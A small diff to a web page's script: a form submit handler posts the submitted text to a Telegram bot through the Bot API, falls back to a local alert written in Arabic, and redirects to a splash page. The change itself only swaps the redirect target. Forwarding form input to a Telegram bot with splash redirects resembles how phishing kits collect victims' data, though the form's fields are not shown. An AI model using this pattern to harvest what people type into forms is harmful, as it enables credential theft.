@@ -205,7 +205,7 @@ form.addEventListener('submit', function(e){
   if (!BOT_TOKEN || BOT_TOKEN.includes('ضع_توكن') || !CHAT_ID || CHAT_ID.includes('ضع_ChatID')){
     alert('تنبيه: لم تقم بإضافة بيانات بوت التلجرام في الكود. سيتم عرض النتيجة محليًا.');
     console.log('payload ->', text);
-    window.location.href = 'splash1.html';
+    window.location.href = 'splash2.html';
     return;
   }
   fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
@@ -225,4 +225,5 @@ updateButtonState();
 </script>
 </body>
 </html>
+
 
